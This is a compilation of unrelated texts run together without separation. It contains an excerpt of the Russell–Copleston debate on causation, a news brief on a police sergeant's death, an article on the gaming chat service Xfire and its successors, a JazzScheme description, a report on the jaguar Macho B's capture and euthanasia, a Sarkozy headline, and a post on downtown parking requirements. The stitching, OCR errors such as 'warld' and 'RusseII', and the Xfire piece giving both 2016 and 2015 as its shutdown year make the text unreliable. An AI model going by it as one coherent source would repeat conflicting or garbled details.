Yes , I agree , some scientists -- physicists -- are willing to allow for indetermination within a restricted field .
But very many scientists are not so willing .
I think that Professor Dingle , of London University , maintains that the Heisenberg uncertainty principle tells us something about the success ( or the lack of it ) of the present atomic theory in correlating observations , but not about nature in itself , and many physicists would accept this view .
In any case , I do n't see how physicists can fail to accept the theory in practice , even if they do n't do so in theory .
I cannot see how science could be conducted on any other assumption than that of order and intelligibility in nature .
The physicist presupposes , at least tacitly , that there is some sense in investigating nature and looking for the causes of events , just as the detective presupposes that there is some sense in looking for the cause of a murder .
The metaphysician assumes that there is sense in looking for the reason or cause of phenomena , and , not being a Kantian , I consider that the metaphysician is as justified in his assumption as the physicist .
When Sartre , for example , says that the world is gratuitous , I think that he has not sufficiently considered what is implied by " gratuitous . "
Russell : I think -- there seems to me a certain unwarrantable extension here ; a physicist looks for causes ; that does not necessarily imply that there are causes everywhere .
A man may look for gold without assuming that there is gold everywhere ; if he finds gold , well and good , if he does n't he 's had bad luck .
The same is true when the physicists look for causes .
As for Sartre , I do n't profess to know what he means , and I should n't like to be thought to interpret him , but for my part , I do think the notion of the warld having an explanation is a mistake .
I do n't see why one should expect it to have , and I think you say about what the scientist assumes is an over - statement .
Copleston :
Well , it seems to me that the scientist does make some such assumption .
When he experiments to find out some particular truth , behind that experiment lies the assumption that the universe is not simply discontinuous .
There is the possibility of finding out a truth by experiment .
The experiment may be a bad one , it may lead to no result , or not to the result that he wants , but that at any rate there is the possibility , through experiment , of finding out the truth that he assumes .
And that seems to me to assume an ordered and intelligible universe .
Russell : I think you 're generalizing more than is necessary .
Undoubtedly the scientist assumes that this sort of thing is likely to be found and will often be found .
He does not assume that it will be found , and that 's a very important matter in modem physics .
Copleston :
Well , I think he does assume or is bound to assume it tacitly in practice .
It may be that , to quote Professor Haldane , " when I Iight the gas under the kettle , some of the water molecules will fly off as vapor , and there is no way of finding out which wiII do so , " but it does n't follow necessarily that the idea of chance must be introduced except in relation to our knowledge .
Russell :
No it does n't -- at least if I may believe what he says .
He 's finding out quite a lot of things -- the scientist is finding out quite a lot of things that are happening in the world , which are , at first , beginnings of causal chains -- first causes which have n't in themselves got causes .
He does not assume that everything has a cause .
Copleston : Surely that 's a first cause within a certain selected field .
It 's a relatively first cause .
Russell : I do n't think he 'd say so .
If there 's a world in which most events , but not all , have causes , he will then be able to depict the probabilities and uncertainties by assuming that this particular event you 're interested in probably has a cause .
And since in any case you wo n't get more than probability that 's good enough .
Copleston :
It may be that the scientist does n't hope to obtain more than probability , but in raising the question he assumes that the question of explanation has a meaning .
But your general point then , Lord RusseII , is that it 's illegitimate even to ask the question of the cause of the world ?
Russell : Yes , that 's my position .
Copleston :
If it 's a question that for you has no meaning , it 's of course very difficult to discuss it , is n't it ?
Russell : Yes , it is very difficult .
What do you say -- shall we pass on to some other issue ?

The police officer found dead at a station in Melbourne ’s outer east last night has been named as Sergeant Anthony Vangorp .
The 47 - year - old officer in charge had been under investigation for ‘‘ serious discipline matters ’’ in the week before his death , Victoria Police confirmed in a statement .
Two officers returning from divisional van duties found Sergeant Vangorp ’s body at the Healesville police station about 9.30 pm .
He had a gunshot wound to the head , believed to have been inflicted by a police gun , which was found at his side .
His death is not being treated as suspicious .
Xfire then and now – What happened to it ?
Xfire was an instant messaging application that was designed for gamers .
It made finding and organising gaming sessions with your friends so much easier and was one of the earliest examples of a social network purely for gamers .
The Xfire download had loads of great features including a server lookup that made finding games you wanted to play easy .
Despite having millions of users , the service was shut down in 2016 , leaving many gamers without a way to easily message each other or discover new servers .
On this page , we ’ll be explaining what Xfire was , what happened to it and alternatives you can use now it ’s gone .
You ’ll be able to see a complete history of the Xfire client and why things went wrong for the service .
This page will also be looking at Xfire ’s competitors , and which of them still remain active today .
You might miss using Xfire gaming to chat with your friends and game together , but there are plenty of great alternative services out there for you !
What Was Xfire ?
Xfire was an early form of social media that was built around video games .
The original aims of the service were to provide a simple chat service that would let you show your friends what games you were playing and easily talk to one another .
Starting out life as an online site , Xfire eventually released a client that allowed for instant messaging , voice chat , server lookup and more .
This service basically paved the way for modern online communication platforms and helped to make online gaming easier and more fun .
Before Xfire was formed , arranging gaming sessions with your friends meant calling them up or going around to their house .
With Xfire , you could instantly see what games your friends were playing and ask to join .
Other services that Xfire provided included tracking stats while you played , the ability to take screenshots , in - game voice chat , file sharing and even live streaming .
The service quickly became a hub for gamers to chat , interact and have fun together .
If you ever played video games on your PC during the 2000s , you probably used Xfire at some point or at least knew someone who did .
The service rapidly grew in popularity as it made gaming so much simpler .
Competitors started to take notice and release their own chat clients and server lookup tools , but Xfire remained one of the most popular chat services on the web for a long time .
At its peak , more than twenty - one million people used Xfire from more than 100 different countries around the world .
It ’s no surprise then that so many people were upset when it finally closed down fifteen years after it was first founded .
Today , other services fill the roles that Xfire provided , but it still remains a big part of online gaming history .
Many gamers will fondly remember using Xfire to connect with new and old friends and have loads of fun while playing online video games .
It ’s a shame that it had to go , but it ’s unlikely it will be forgotten .
Services that Xfire Offered
Xfire offered loads of different services and features to help make gaming with your friends easier .
In this part of our guide , we ’ll be explaining the different features and how they were used .
You ’ll also be able to see which modern services now offer these features and whether you can still use them today .
Xfire Site
Xfire.com was primarily a social media site for gamers .
At first , the site was simply a place where you could signup , login and meet people to play with .
You ’d be able to add all of your friends and see when they were online and what they were playing .
This made organising games between your friends much easier as you could easily see when they were online .
Your Xfire profile was where people could see what games you were playing , your progress and whether you were currently online or not .
Later on , stat tracking was also added to the Xfire profiles to give players a way of seeing how good their friends were .
The Xfire site was originally planned as an alternative social media site to Myspace ( which was the main social media site of the time ) .
Myspace allowed people to connect with their friends , see what music they were listening too and communicate by posting on their page .
Xfire had a similar model , and this was a big part of its early success .
As the site grew , the number of features and services offered did too .
Players could upload their favourite in - game screenshots and videos to their pages and view live content from their friends .
At the time , no other site really offered something like this and Xfire was definitely a trailblazer in terms of social media for gamers .
If you wanted to join up to Xfire , all you needed was a username and an email address .
You then synced the site up to your computer so it could see when you were online and which games you were playing .
Players used their Xfire account as a way to connect with other gamers from all over the world and take part in the boom of online gaming which was just starting to take off in the early 2000s .
Xfire Chat
Probably the most popular aspect of Xfire was its chat client .
This was a program for Windows PCs that allowed you to instant message and voice chat with your Xfire friends .
The chat Xfire download was a quick and simple process .
You only needed to download the program and install it on your PC in order to access it .
Once the app was installed , you simply signed in using your Xfire login and password and could then connect with all your friends .
The Xfire chat showed you which of your friends were online and what games they were playing .
You could send quick chats to your friends or join them in a voice chat .
The voice chat feature of Xfire was one of the main reasons for its popularity .
At the time , there just were n’t that many options for gamers who wanted to join voice chat channels with each other .
Xfire changed that by making it quick and simple to connect with your friends and communicate more clearly .
Today , there are lots of different voice chat programs for gamers , but at the time , Xfire was fairly revolutionary .
The Xfire team listened to suggestions from its fans and helped to make improvements and adjustments to make things easier to chat and talk with your friends .
After a while , other services started to copy Xfire , but it still remained one of the best ways to chat with all your friends while playing video games online .
Xfire Friends
One of the main reasons why Xfire was established was to make it easier to game with your friends ,
As a social media site , you could add your friends using their email or username and this included people you met in - game .
Users quickly built up friend lists of people who enjoyed playing similar games to them , and you could see which of your friends were currently online by looking at the friend list .
One of the best aspects of the friend list was that you could instantly join your friend ’s game if they were online .
Provided you were logged in , and they were in a joinable game , you simply had to click once to quickly join the game they were playing .
This functionality was soon copied by other services and platforms , but Xfire really helped to popularise the one - click join feature .
Gamers might take it for granted today but before this feature was introduced , joining your friends in their gaming session was difficult and sometimes convoluted .
With the Xfire site , finding and entering games with your friends was so much easier , and players were soon having more fun than ever while online gaming .
The main advantage of online gaming over regular gaming is the social aspect , so it was important for a service like Xfire to exist that allowed people to be more social while playing .
Xfire Server Search
Back in the old days of online gaming , you normally had to find a server in order to play .
While today there is online matchmaking that pairs you up with other players , servers were the old - school ways to find a game .
You ’d load up your game and then search for a server which had the game type you wanted to play .
You had to make sure that the server was public and that there was enough room to join .
Sometimes this was a long and slow process because of how many servers there were .
Finding the exact game type you wanted and making sure that there were n’t too many players was a challenge .
Xfire set out to make things much easier for people by providing a simple server lookup .
This server lookup feature allowed you to search for the game you wanted and the type of server you wanted to play on .
You could narrow your search by looking specifically for servers in certain locations and looking for servers that were public and were n’t already full .
This made the process of finding an online game so much simpler .
Today , a lot of games use matchmaking rather than using different servers , so the feature is n’t as important as it was back then .
Still , many games do have servers , and there are a few different platforms out there which offer a service similar to the Xfire server list .
Xfire Stat Tracking
One of the most interesting features offered by Xfire was the game statistic tracking .
A lot of different services offer to track your in - game stats today , but Xfire did it before any of them .
If you had an Xfire profile and the Xfire client , it would automatically track your stats as you played .
These statistics included time spent playing , and the type of game played .
The company used these statistics to provide insights into the games industry and show developers and publishers which games were getting the most playtime .
The statistics also allowed people to see how long they were playing certain games and which games were their favourite in terms of time played .
You could access all of your game time statistics on your Xfire profile and see a ranking of all your most played games .
Xfire also allowed you to see playing statistics of your friends .
You could visit their profile and see which games they spent the most time playing .
This was a fun way of keeping track of the games your friends were playing and also for seeing which games were the most popular on the site .
At the time , top games on the Xfire site included World of Warcraft , Counter - Strike Source and Call of Duty 2 .
Today , lots of gaming platforms allow you to see accurate information about how long you ’ve played each game for .
While it ’s not a new feature , it ’s still one that ’s popular with both gamers and industry professionals for the insights that it provides .
Xfire Screenshot Capture
This feature let you capture and save your favourite gaming moments while you were playing .
Although in - game screenshots are fairly common today , back in the days of Xfire it was rare to find a service that let you take screenshots while you were playing .
This was a fan requested service that soon found its way into the Xfire download client after so many people requested it .
Players could now take a quick screenshot with the simple press of a button and capture a moment forever .
You could then login to your profile , view your screenshots and save your favourites .
Xfire allowed you to post your favourite screenshots on your profile and show them off to all your friends .
Whether you ’d just achieved an impossible feat in the game , or you just wanted to show off how your character looked , in - game screenshots were an excellent way for gamers to express themselves .
Screenshots soon became something of an artform with players trying to take the best photos using different lighting techniques and showing characters in ways they ’d never been seen before .
Today , screenshots are still a big part of video games but have largely been overtaken by video capture and live - streaming .
Xfire Video Capture
In 2008 , Xfire updated its platform to include video capture .
Video sharing was rapidly becoming more popular thanks to sites like YouTube that allowed people to publish their own videos .
Video game video clips were one of the most popular categories on early YouTube , and gamers loved to share clips of their success or funny moments .
At the time , the number of video capturing programs were limited , so Xfire users requested that the team add functionality to allow for game footage to be recorded .
Xfire worked quickly at setting up this feature as they recognised how important video sharing could be .
The video capture tool allowed Xfire users to upload , tag and share their videos .
Xfire profile pages quickly became the place for loads of unique and original video game clips , all uploaded by users .
Starting the video capture process was simple users simply had to hit scroll lock and “ v ” in order to start recording a clip .
Once the clips were recorded , they would automatically be uploaded to the user ’s profile page .
Here you could decide whether you wanted to keep or remove the clips and you could add tags to help other users find them .
It was also possible to download your videos so you could share them on other sites like YouTube .
There was an even additional service called Xfire Flashback that let gamers record an event five to ten seconds after it happened .
This way , it was possible to catch every major gaming moment and never miss out on any potentially awesome footage .
At its peak , Xfire users were recording an incredible five million videos each month .
Xfire Live - Streaming
These days , live streaming video games is huge with services like Twitch and YouTube providing platforms for millions of video gamers to watch live streams from their favourite players .
In 2012 , Twitch was still relatively small but growing fast .
Xfire recognised its potential and implemented Twitch streaming capabilities into its service .
Users could download the Xfire client and use it to stream directly to Twitch through the Xfire program .
This made things much easier not just to stream , but also to watch streams .
Fans of streaming were thrilled by the partnership between Twitch.tv and Xfire , and it showed that the service had big things in store for its users .
Xfire users were soon broadcasting live streams of their gameplay for fans all over the world to enjoy .
The site made it much easier to set up a stream , and during its most popular years , Xfire users were broadcasting tens of millions of minutes of gameplay each month .
A lot of Twitch.tv early users came from the partnership between Twitch and Xfire , with millions more people being exposed to video game streaming while it was still a relatively new concept for most people .
Now , video game streaming is one of the biggest new forms of entertainment , and Twitch is still growing each year .
﻿
Xfire Tournament Platform
In 2014 , Xfire looked to ride the wave of eSports popularity by releasing its tournament platform .
This service sought to provide a better experience for tournament organisers and participants , making eSports tournaments easier to plan and play in .
The platform was aiming at three different types of users .
First , the experienced event organiser who runs hundreds of events per year and wants an easier way to integrate everything .
Secondly , the game publishers themselves who are active in the eSports community and wants to provide a great tournament experience .
Lastly , the casual player who wants to be able to set up tournaments with their friends .
With the Xfire tournament platform , players could create and enter tournaments for free .
Creating a tournament was easy , and there were five simple steps to follow to ensure everything was set up correctly .
Teams could be managed through the platform , and automatic score reporting helped to give accurate results for each match .
The service even integrated specific games such as League of Legends , Dota 2 , Starcraft II and Call of Duty .
It made eSports much more accessible and fun for the average person .
While the platform perhaps did n’t take off in the way that the Xfire team expected , it did lay the groundwork for other services to launch eSports platforms of their own .
Today , there are lots of different online platforms where you can easily create custom eSports tournaments , invite your friends and record all of the results .
While Xfire may be gone , organising your own eSports tournament is still possible and easier than ever .
The History of Xfire
Xfire Inc was first established in 2002 by founders Dennis Fong , Mike Cassidy , Max Woon and David Lawee .
The site was originally called Ultimate Arena but later changed its name to Xfire after the success of the desktop messaging program is released .
In 2003 , the Xfire team developed the messaging client , which would revolutionise the way people played online video games with their friends .
Chris Kirmse was one of the lead developers on the project and had previously built a similar client for Yahoo .
Kirmse came up with the idea after seeing how difficult it was to organise online games with your friends .
Most people did n’t own a cellphone at the time , and Kirmse wanted to be able to see what games his friends were playing so he could join them .
The service was quickly a hit soon after it launched , with millions of gamers soon signing up and downloading the client for their PCs .
In 2006 , Xfire was bought by media conglomerate Viacom in an incredible $ 102 million deal .
By 2007 , the service announced it had reached a big milestone of 7 million registered users .
Part of Xfire ’s success was down to the fact that the team behind the service regularly took onboard suggestions from its users .
The site featured a forum , and there would be surveys that let users say which features they were most interested in .
As Xfire grew , it added new features such as in - game screenshot capturing , voice chat , video capture and live streaming .
After the company was bought by Viacom , however , things stagnated .
Viacom did n’t have a real plan for Xfire and gave very limited resources to the team while asking them to hit unrealistic goals .
This led to a lot of the original team behind the program leaving , and eventually , very few of the Xfire team remained .
Competition with other rival services had also increased in this time .
Steam , in particular , had started to adopt many of the features that had made Xfire so popular .
This created a situation where the team had to constantly try and innovate to provide a better service than their bigger competitors .
Eventually , Viacom sold Xfire to Titan Gaming in 2010 .
Titan Gaming aimed to figure out a way to keep Xfire relevant in the wake of Steam ’s growth and increasing hold on the market .
Fewer and fewer users needed to have a separate live chat and messaging service because Steam , a game client now provided all of these features itself .
Titan Gaming decided to take the company in a different direction , focusing more on the original Xfire site and how it could be used by gamers to set up tournaments and competitions .
With the growing popularity of eSports , the team at Xfire hoped they could build something to help organise professional tournaments .
The idea was to turn Xfire from a regular gaming platform into a brand new eSports platform just as eSports were starting to take off around the world .
The Xfire team relocated to China where eSports were already a nationwide phenomenon , and PC gaming was becoming hugely popular .
In the end , the switch to focusing on the Chinese market proved unsuccessful , and Xfire refocused on creating and eSports tournament platform for gamers in the US .
The platform never really took off , and in 2015 , the Xfire site and Xfire download client were sunset .
The homepage of the site linked to an export page which allowed users to download all of their data including previously uploaded videos and screenshots .
Why Was Xfire Shut Down ?
Xfire ’s closure came as a shock to many of the people that used the service .
However , to those who were part of the industry , it was perhaps less of a surprise .
There were many different factors that lead to the downfall of the service , and there is n’t a single main reason that stands out over the others .
Here we ’ll be explaining all the different factors that caused Xfire to shut down and whether anything could have been done to save the service .
Competition
One of the main reason ’s for Xfire shutting down was the increased competition from other services .
As Xfire grew , it attracted the attention of services such as Steam and others , which then implemented its features into their platform .
Despite its size , Xfire was a lot smaller than some other gaming services out there and could n’t compete with services such as Steam which had a huge user base .
With each new feature Xfire innovated , trialled and released , other services would copy and use for themselves .
The instant join , friend list , voice chat and game stats were all copied by competing platforms , meaning that Xfire did n’t have the advantage over the rest of the market .
The world of business is a ruthless one , and unless you can prevent your competitors from implementing the features you create , innovation is always going to be copied .
Today , Steam is the largest video gaming platform in the world and has an incredible 95 million users .
This number is partly thanks to it adopting friends lists and other social media features first used by services like Xfire .
Other services that started to offer features that had been exclusive to Xfire included Teamspeak , Discord and Twitch .
All of these services took features that were successful on Xfire and applied them to their platform .
Soon , Xfire had very little to offer that was unique , and this meant that it failed to attract new users .
Later on , Xfire continued trying to innovate and release new features such as the Xfire tournament platform .
However , by this point , it was much harder to attract new users thanks to the growth of other services .
The challenge with any kind of social media is to always be growing and attracting new users .
If there are too many competitors , it becomes an uphill struggle .
Poor Management
The original Xfire team was well organised , well managed and set clear and reasonable goals to work towards .
The early success of Xfire was attributed to the team always listening to the needs of their community .
Xfire released regular updates that improved the services , adding new features as requested by its users .
However , once Xfire achieved success and was bought by Viacom , things changed .
Some of the members of the old team , including CEO Mike Cassidy , left the organisation to start new ventures .
At this point , in 2006 , things were still going well for Xfire , but it all started to change from this point on .
The goal had been for both services to grow from each other , with Xfire benefiting from Viacom ’s large number of users and Xfire giving Viacom a way of reaching gamers .
The Xfire team was set high targets for monetisation with little thought given to growth .
They also received very few resources to complete these targets .
With the acquisition not turning out the way Viacom had hoped , the person who had been behind the purchase of Xfire was fired , and the Xfire team was essentially abandoned within Viacom .
Within around two years , almost everyone from the original Xfire team had left the company , all that remained were the product development team .
At this point , Viacom managed to sell Xfire to Titan Gaming .
Here the management at least had a clear idea for the direction of the service .
At this point , though , competitors such as Steam had started to provide all of the features that Xfire had once boasted as exclusive to its service .
The Viacom sale had unfortunately been a big backward step for the company and left Xfire behind all of its competitors with no clear strategy of how to move forward .
Due to the conditions during this time , most of the original team left , and the company lost its direction .
Failed Attempt to Expand in China
When Xfire was bought by Titan Gaming , the team recognised that they needed to do something drastic to bring in new users .
The team were all big fans of eSports , and at the time , eSports and PC gaming was rapidly growing in China , an emerging market .
The idea was to release Xfire in China and allow for gamers in China to communicate with each other and organise games more easily .
The company raised investment money and took on new management to help them achieve their goal of expanding into Asia .
Unfortunately , the move never really worked out and only succeeded in wasting another two years of the team ’s time and the money of their investors .
The ideas of the investors ended up clashing with the aims of the management , and there was a lack of clear direction once again .
Some of the team decided to instead work on the eSports tournament platform to capture the excitement of the growing eSports trend .
This was launched in 2014 , but by this time , it was already too late for Xfire .
The company sunset its chat client and social media site in 2015 , the same year that Discord launched its free chat service .
Alternatives to Xfire 2020
Today , Xfire is unfortunately no longer around .
This was a major blow to a lot of gamers who spent many years using the different services and features it provided .
When it first announced it was closing down , a lot of people were unsure about which service to use next .
While Xfire had its competitors , most of them were n’t as big or as popular as Xfire .
That said , in 2020 , there are loads of great alternatives to Xfire that help you make the most out of your online gaming experience .
On this page , we ’ll list the top alternatives and the features and services they provide .
Some of them are all - in - one services , while others are more focused on one or two key features .
We ’ll explain how to sign up and use each service and the best features of each .
Steam
Steam is an online video game distribution service started by Valve Corporation .
First released in 2003 , Steam was originally a way to apply multiple updates to games published by Valve .
Since its initial release , however , Steam has grown to become the largest digital distributor of video games on the PC and has since also become a social hub for gamers .
Today , Steam is a place where users can purchase thousands of different games from third - party publishers and also includes features such as server hosting , video streaming and general social networking features .
Users can add their friends , see which games their friends are playing and chat and invite their friends into their games .
Steam and the Steam client are available on Windows , macOS , Linux , iOS , Android and Windows Phone devices .
The platform is localised for many different countries around the world and includes support for twenty - eight different languages .
In 2019 , Steam had more than 30,000 different games across all genres and more than 95 million active users each month .
Although Steam just started out as a way for users to download updates for Valve games , it has evolved into a behemoth that is synonymous with PC gaming .
Steam has even launched its own line of consoles and controllers to make gaming easier .
When it comes to social features , a lot of what Steam offers originally started out as features of Xfire .
The Xfire team would come up with a new way for gamers to interact with each other and Steam would adopt the feature and include it in their service .
Since Xfire shut down , Steam has become the predominant social media site for gamers .
It allows you to add your friends , see which games they ’re playing and invite them to your game .
Although Xfire might be gone , some of the best features of the site and client are now available on Steam .
You can use a server lookup , find your friends and view their games .
It helps gamers to stay connected despite losing Xfire and has a huge number of active users .
Discord
Discord is a free to use VoIP program that lets you call and chat with people through the internet .
VoIP stands for Voice over IP and allows you to chat with anyone in the world through the internet .
Discord lets its users form communities where they can chat , send pictures , video and speak to each other .
Primarily aimed at gamers , the site lets anyone join and form their own personal communities or servers where they can add their friends to the conversation .
Users can look up certain public servers with the use of tags , helping them to find likeminded people with the same interests .
The Discord application was first released in 2015 , the same year that Xfire shutdown .
It helped to fill the gap that Xfire left when it closed its service .
Many gamers were without a place they could chat and make calls to organise their gaming sessions .
Discord is the perfect alternative and is available to download on Windows , macOS , Linux , iOS and Android .
Users can also access Discord through their web browser , using it to find servers and communities to chat with .
The voice chat service was one of the biggest and most popular features of the Xfire download client , so it ’s good that Discord is available as a viable alternative .
Playing modern online games without constant voice communication can be difficult as more games than ever require coordination and effective teamwork .
Before Xfire and Discord , most VoIP services required you to enter in an IP address to connect to a call .
Discord aimed to make things much simpler and soon became a popular alternative to text - based IRC channels .
The eSports and gaming community were quick to pick up Discord after the loss of Xfire and gaming servers are now one of the most common types of server on the platform .
Twitch
Twitch is an online streaming platform that was first established in 2011 .
Originally meant just for video games , Twitch.tv now contains live - streams of just about anything .
Twitch was started as a spinoff of Justin.tv , which was a general live - streaming site .
By 2013 , traffic to Twitch had more than 45 million unique viewers and was the fourth most visited site in the US .
By this point , it had eclipsed the popularity of its parent site , and Justin tv was eventually shut down in 2014 .
Twitch had , at one point partnered with Xfire to make it easier for gamers to stream their games to their friends and other viewers .
As the popularity of Twitch grew and Xfire struggled , this partnership eventually ended , and Xfire was shutdown .
Despite this ,
Twitch remains the most popular platform for online streamers and viewers .
Today it has more than 15 million daily active users and brings in hundreds of millions in ad revenue .
Twitch was bought by Amazon in 2014 for close to $ 1 billion and has continued to grow since then .
Twitch is synergised with Amazon Prime , meaning users with a Prime account can subscribe to their favourite streamer on Twitch .
As technology has improved , Twitch has also made it easier than ever for people to stream their video games online .
A lot of games even have Twitch integration that makes streaming even simpler and gives more control to streamers and content creators .
Because of this , services like Xfire are mostly no longer needed as streaming is now simple and relatively straightforward .
Twitch also has loads of great social elements such as being able to follow and subscribe to streamers you like , special emoticons and tipping .
Other streaming platforms such as YouTube , Facebook and Mixer have attempted to take over the number one spot .
For now , though , Twitch remains the number one place to watch streams online and includes loads of great features to make streaming more enjoyable for streamers and viewers .
JazzScheme is a development system based on extending the Scheme programming language and the Gambit system .
It includes a module system , hygienic macros , object - oriented programming , a full - featured cross- platform application framework , a sophisticated programmable IDE and a build system that creates executable binaries for Mac OS X , Windows and Linux .
JazzScheme has been used for more than 10 years to develop commercial software .
2017-01-06 - JazzScheme is alive and well .
Go to the Github repository and enjoy !
More news coming soon
JazzScheme was born in 1996 out of some profound convictions :
The Lisp community should not be dreaming of sophisticated GUIs and IDEs but instead be the one pushing the boundaries of what can be accomplished !
There is no single truth in computer science and Lisp 's meta - language capabilities and dynamic nature makes it the ideal language to unify in a coherent approach many great paradigms like :
Lisp is one of the greatest tools to experiment with new concepts and implement them .
In the long run , enable more Lisp / Scheme programmers to develop at work in the language they love :)
But by enabling people to create and commercialize radical products that would have been almost impossible to develop using mainstream languages ( time , cost , feasibility , ... )
Not by trying to convince people of their advantages
Operating Systems
The Jazz kernel runs on most operating systems .
It is entirely written in mostly portable pure Scheme with the wonderfull Gambit Scheme system as primary target .
The cross-platform GUI is a high level framework written in Jazz that uses Cairo for backend .
It runs on Windows and X11 .
On Mac OS X , the X11 version can be used and works very well .
The curious case of Macho B , the jaguar captured in southern Arizona , has quickly descended into finger pointing and official investigations .
There are questions about whether the jaguar was euthanized too quickly , as well as accusations he was captured on purpose , not accidentally , as the Arizona Game and Fish Department has stated .
On Thursday , the U.S. Fish and Wildlife Service said its law - enforcement division had begun a criminal investigation into all aspects of the capture and death of the animal .
It began its investigation after a request from U.S. Rep. Raul Grijalva and because Game and Fish asked for an outside agency to look into what happened .
Already , the complicated legacy of the jaguar 's capture and death stands in stark contrast to the simplicity of his life , when he roamed northern Mexico and southern Arizona for 15 years .
The jaguar , an endangered species , was captured on Feb. 18 by a team led by the Arizona Game and Fish Department .
From the very beginning , Game and Fish said the capture was inadvertent .
The agency said it was trapping as part of a years - long study of other large mammals in a remote section of the Coronado National Forest west of Nogales .
Once a jaguar was captured , Game and Fish decided the opportunity to learn more about the elusive animal was so compelling that Macho B was sedated , fitted with a satellite radio transmitter , and released .
Jose Viramontes , of the U.S. Fish and Wildlife 's regional office in New Mexico , said Arizona Game and Fish had the necessary permits to capture an endangered species as long as it was part of conservation efforts .
Macho B's radio collar would broadcast his location every three hours .
After just a few days , however , those signals indicated trouble .
The cat was not moving as it should .
On March 2 , Macho B was found , tranquilized again , and flown by helicopter to Phoenix Zoo .
Hours later , zoo veterinarians decided the cat was suffering acute kidney failure and advised officials from Game and Fish and the U.S. Fish and Wildlife Service that Macho B should be euthanized .
In recent days , however , there have been questions about the jaguar 's treatment .
Macho B was very old for a wild animal , but when he was captured on Feb.
18 , Game and Fish described him as " thick and solid . "
They went on to add that " field biologists ' assessment shows the cat appeared to be healthy and hardy . "
But 12 days later , he was said to have " off - the - charts kidney failure . "
After Macho
B's death , some of his tissues were sent to the University of Arizona 's veterinary diagnostics laboratory .
One of the pathologists there , Dr. Sharon Dial , said Macho B's kidneys were not in chronic failure .
They were , in fact , fairly healthy .
She contended that Macho B may have been put down too soon .
Arizona Game and Fish pilloried her .
Her comments , the department said in a statement , were " outrageous , unprofessional and speculative . "
Dial regretted that she may have put her lab in a " difficult position . "
But she is not backing down from her assertions .
" The kidneys did look good , " Dial said .
One of the veterinarians who treated Macho B at the zoo , and who made the recommendation that he be put down , said he stands by his decision .
" He was in kidney trouble , big time , " Dr. Dean Rice said .
" His ( kidney function ) readings were n't high , they were off the scale .
It did n't matter if it was acute or chronic . "
Rice said that people who question if Macho B was put down too soon are forgetting the animal .
" The question becomes : How do you treat this animal ?
Keep him sedated for days ?
That 's no good .
You wake him up , you knock him down .
You wake him up , you knock him down .
That 's not good for the cat .
It would be tough for a zoo animal , and this was a wild animal . "
Rice said if given the chance , he would treat the animal the same way .
" He was in very serious trouble , " Rice said .
" I think it was virtually impossible to treat him . "
Grijalva wants all aspects of the animal 's capture and death investigated , including whether the animal was targeted for capture by Game and Fish .
His request may stem in part from startling accusations about the capture of Macho B . A woman directly involved in the capture said it was no accident .
Janay Brun , working with Game and Fish as a member of the Borderlands Jaguar Detection Project , told the Arizona Daily Star that she baited the trap that caught Macho B with jaguar scat as part of an effort to capture a jaguar and now regrets it .
" That jaguar meant a lot to me , and the fact that I mindlessly participated in this , it 's a regret I 'll have for the rest of my life , " Brun told the Tucson paper .
Arizona Game and Fish vigorously denies her accusations .
Larry Voyles , the director of the department , said the jaguar was captured during a study of black bears and mountain lions .
" We knew there was the potential to ensnare a jaguar , " Voyles said .
" That was not the purpose or intent . "
Voyles said that once the animal was ensnared , his agency needed to sedate it .
" You must tranquilize the animal to remove ( the snare ) .
That 's the hard part .
Putting a collar on it is easy , " Voyles said .
" To fail to put the collar on it , with very little additional risk , would be irresponsible . "
The agency did have a plan in case it captured a jaguar , but that is not the same as planning to capture a jaguar , according to Voyles .
" We had a duty to be prepared , " he said .
The necropsy of Macho B is ongoing at different locations .
The data will be reviewed by Dr. Linda Munson , a veterinary pathologist and big-cat expert at the University of California - Davis School of Veterinary Medicine .
Viramontes said his agency will look at all aspects of what happened but " could not comment on the specifics . "
Voyles defended Arizona Game and Fish .
He said that based on the information he has , and unless an investigation yields new facts , he would do nothing different .
" Not that I can think of , " Voyles said .
And then he paused .
" We wish the whole circumstance had not occurred . "

L'Americain in Washington Sarkozy Searches for Friendship with Obama that Has Eluded Him
With his power wobbling at home , the timing of Nicolas Sarkozy 's visit to Washington could n't be better .
The French president 's meeting with Barack Obama will provide exactly the images he needs in France .
But in truth , his relationship with the US president is a tense one .
Even in cities that embrace transit - oriented development , too much parking can counteract efforts to create a walkable , attractive downtown .
Two recent stories in the Stamford Advocate demonstrate the difficulties involved as the paper ’s namesake city works to redevelop the area around its Metro - North station .
Stamford has designated a special “ Transportation Center Design District ” near the train station , and its zoning board just agreed to reduce the amount of required parking in housing developments in that zone .
But requirements are arguably still too high .
According to developers , surveys of downtown buildings show that residents of those buildings actually use less than one parking space per unit .
But the new regulations require that residential developments provide 1.25 spaces per unit .
( The old zoning was even more stringent , mandating at least 1.25 spaces for every studio and one - bedroom unit and at least 1.5 spaces for larger units . )
Still , the zoning board ’s decision recognizes that those living near the station ( the second - busiest in Metro - North ’s system ) will require less parking than residents further away .
But plans to upgrade the station envision the addition of hundreds of new parking spaces , which will almost certainly increase area traffic .
Is that the right move , and is it consistent with the city ’s plans to improve transit and cycling connections through the Urban Transitway project ?
Stamford is hardly the only city struggling with these issues .
In Flushing , Queens , a new development is being planned with more than twice the parking required by the zoning code — 1,600 spaces for 620 residential units and 500,000 square feet of retail and office space — at the insistence of the NYC Economic Development Corporation and some business groups .
The project , Flushing Commons , will be blocks from a major subway stop , LIRR station , and over 20 bus routes .
A recently released report from the Institute for Transportation and Development Policy shows that most cities essentially use junk science to develop their parking policies .
Parking requirements are often based on what the neighboring town is doing , or on the outdated Institute of Transportation Engineers ’ Parking Generation manual , which bases many of its recommendations on suburban land use patterns .
Standards based on specific neighborhood context are rare , and even less data informs overall parking strategy .
In fact , this week San Francisco became the only major city in the United States to complete a census of all publicly accessible parking .
This lack of rigor is compounded by the political popularity of free parking and often leads to a “ more is better ” approach .
For example , Hartford has quadrupled its downtown parking since the 1960s , according to research by TSTC board member and UConn professor Norman Garrick .
But this was hardly an effective strategy if the goal was to keep the city economically competitive .
In the same time period , downtown Hartford lost 60 % of its residents and the city as a whole lost population and jobs .
Three - tenths of downtown Hartford is now devoted to parking , but there are still complaints that it is “ not enough . ”
Parking has pushed out other uses and made parts of downtown unattractive for walking , which creates an incentive to drive instead of taking transit , which creates demand for more parking , which blights more of downtown .
But the ITDP report also shares success stories from cities where smarter management of existing supply , market - based pricing of parking , and zoning changes help support more active downtowns that encourage transit use , walking , and cycling .
For example , shared parking for commuters and residents could work for Stamford , since at least some residents ’ cars will be gone during the daytime hours when commuters need spaces .
